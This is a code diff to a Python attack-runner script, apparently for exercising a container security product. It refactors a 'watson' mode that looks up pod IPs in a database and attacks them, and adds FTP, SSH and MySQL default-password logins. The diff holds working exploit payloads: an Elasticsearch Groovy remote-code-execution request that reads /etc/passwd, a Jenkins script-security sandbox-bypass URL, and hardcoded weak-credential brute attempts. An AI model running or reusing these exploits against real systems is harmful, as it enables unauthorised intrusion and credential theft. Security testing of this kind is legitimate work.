@@ -1,8 +1,10 @@
-import sys, argparse, os, time, json, pymysql
+import sys, argparse, os, time, json, pymysql, ftplib, paramiko
 
 attck_dict = {'ca':'credential access', 'def':'defense evasion', 'disc':'discovery', 'exec':'execution', 'exf':'exfiltration', 'move':'lateral movement', 'pers':'persistence', 'priv':'privilege escalation', 'all':'all scripts'}
 
 goat_dict = {'chroot':'CHROOT-CONTAINER-ESCAPE', 'dind':'docker-in-docker', 'info':'Gaining-environment-information', 'bypassns':'K8s-Namespaces-bypass', 'procfs':'procfs-escape', 'cgroup':'cgroup-escape', 'debugfs':'debugfs-escape'}
+
+watson_ids ={'redis':'51c1c6', 'es':'75fb1c', 'tomcat':'b0f328', 'jenkins':'99a7ca', 'jupyter':'ddc305', 'ftp':'42cca6', 'ssh':'98166d', 'mysql':'588ee1'}
 
 script_dir = '/test/'
 
@@ -12,10 +14,10 @@ def parse_args():
     parser.add_argument("--attck", help="run ATT&CK-Script")
     parser.add_argument("--goat", help="run K8S-Goat-Script")
     parser.add_argument("--cve", help="run CVE-POC")
+    parser.add_argument("--watson", help="run Watson-Script")
     parser.add_argument("--rs", help="run Reverse-Shell-Script", action="store_true")
     parser.add_argument("--cm", help="run Crypto-Miner-Script", action="store_true")
     parser.add_argument("--dp", help="run Drift-Prevention-Script", action="store_true")
-    parser.add_argument("--watson", help="run Watson-Script", action="store_true")
     parser.add_argument("--test", help="run ATT&CK test", action="store_true")
     parser.add_argument("--report", help="show attack's results", action="store_true")
     return parser.parse_args()
@@ -91,49 +93,80 @@ if args.watson:
 		RDB_DBNAME = 'ivan'
 	db = pymysql.connect(host=RDB_HOST, port=RDB_PORT, user=RDB_USER, password=RDB_PASSWORD, database=RDB_DBNAME)
 	cursor = db.cursor()
-	#redis
-	cursor.execute("select pod_ip from ivan_assets_pod_res_relations where pod_name like '51c1c6%'")
+	watson_id = "'" + watson_ids[args.watson] + "%'"
+	sql = "select pod_ip from ivan_assets_pod_res_relations where pod_name like " + watson_id
+	cursor.execute(sql)
 	data = cursor.fetchall()
-	for ip in data:
-		print (ip[0])
-		res = os.popen("curl " + ip[0] + ":8080 --connect-timeout 3").read()
-		print(res)
-		os.popen("redis-cli -h " + ip[0])
-	#es
-	cursor.execute("select pod_ip from ivan_assets_pod_res_relations where pod_name like '75fb1c%'")
-	data = cursor.fetchall()
-	for ip in data:
-		print (ip[0])
-		res = os.popen('curl ' + ip[0] + ':9200/website/blog --data \'{"name":"test"}\' --connect-timeout 3').read()
-		print(res)
-		res = os.popen('curl ' + ip[0] + ':9200/_search?pretty --data \'{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"cat /etc/passwd\\").getText()"}}}\' --connect-timeout 3').read()
-		print(res)
-	#tomcat
-	cursor.execute("select pod_ip from ivan_assets_pod_res_relations where pod_name like 'b0f328%'")
-	data = cursor.fetchall()
-	for ip in data:
-		print (ip[0])
-		res = os.popen("curl " + ip[0] + ":8080 --connect-timeout 3").read()
-		print(res)
-		res = os.popen("curl " + ip[0] + ":8009 --connect-timeout 3").read()
-		print(res)
-	#jenkins
-	cursor.execute("select pod_ip from ivan_assets_pod_res_relations where pod_name like '99a7ca%'")
-	data = cursor.fetchall()
-	for ip in data:
-		print (ip[0])
-		res = os.popen("curl " + ip[0] + ":8080 --connect-timeout 3").read()
-		print(res)
-		res = os.popen("curl " + ip[0] + ":8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true\\&value=public%20class%20x%20%7Bpublic%20x%28%29%7B%22touch+/tmp/test123%22.execute%28%29%7D%7D --connect-timeout 3").read()
-		print(res)
-	#jupyter
-	cursor.execute("select pod_ip from ivan_assets_pod_res_relations where pod_name like 'ddc305%'")
-	data = cursor.fetchall()
-	for ip in data:
-		print (ip[0])
-		res = os.popen("curl " + ip[0] + ":8888 --connect-timeout 3").read()
-		print(res)
-	show_results("\033[31m"+"Successfully exploit watson attacks\033[0m")
+	if args.watson == 'redis':
+		for ip in data:
+			print (ip[0])
+			res = os.popen("curl " + ip[0] + ":8080 --connect-timeout 3").read()
+			print(res)
+			os.popen("redis-cli -h " + ip[0])
+	if args.watson == 'es':
+		for ip in data:
+			print (ip[0])
+			res = os.popen('curl ' + ip[0] + ':9200/website/blog --data \'{"name":"test"}\' --connect-timeout 3').read()
+			print(res)
+			res = os.popen('curl ' + ip[0] + ':9200/_search?pretty --data \'{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"cat /etc/passwd\\").getText()"}}}\' --connect-timeout 3').read()
+			print(res)
+	if args.watson == 'tomcat':
+		for ip in data:
+			print (ip[0])
+			res = os.popen("curl " + ip[0] + ":8080 --connect-timeout 3").read()
+			print(res)
+			res = os.popen("curl " + ip[0] + ":8009 --connect-timeout 3").read()
+			print(res)
+	if args.watson == 'jenkins':
+		for ip in data:
+			print (ip[0])
+			res = os.popen("curl " + ip[0] + ":8080 --connect-timeout 3").read()
+			print(res)
+			res = os.popen("curl " + ip[0] + ":8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true\\&value=public%20class%20x%20%7Bpublic%20x%28%29%7B%22touch+/tmp/test123%22.execute%28%29%7D%7D --connect-timeout 3").read()
+			print(res)
+	if args.watson == 'jupyter':
+		for ip in data:
+			print (ip[0])
+			res = os.popen("curl " + ip[0] + ":8888 --connect-timeout 3").read()
+			print(res)
+	if args.watson == 'ftp':
+		ftp = ftplib.FTP()
+		for ip in data:
+			print (ip[0])
+			ftp.connect(ip[0], 21, 3)
+			try:
+				ftp.login("ftpuser", "ftpuser1234")
+			except Exception as es:
+				print(es)		
+			try:
+				ftp.login("ftpuser", "ftpuser123")
+			except Exception as es:
+				print(es)
+	if args.watson == 'ssh':
+		for ip in data:
+			print (ip[0])
+			ssh = paramiko.SSHClient()
+			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+			try:
+				ssh.connect(ip[0], 22, 'root', 'test12345', timeout=5)
+			except Exception as es:
+				print(es)
+				ssh.connect(ip[0], 22, 'root', 'test123456', timeout=5)
+				stdin,stdout,stderr = ssh.exec_command("pwd")
+				res = stdout.read()
+				print(res)
+			finally:
+				ssh.close()
+	if args.watson == 'mysql':
+		for ip in data:
+			print (ip[0])
+			db_temp = pymysql.connect(host=ip[0], port=3306, user="root", password="123456")
+			cursor_temp = db_temp.cursor()
+			cursor_temp.execute("select version()")
+			data_temp = cursor_temp.fetchone()
+			print ("Database version : %s " % data_temp)
+			db_temp.close()
+	show_results("\033[31m"+"Successfully exploit watson-" + args.watson + " attacks\033[0m")
 	db.close()
 
 if args.test:
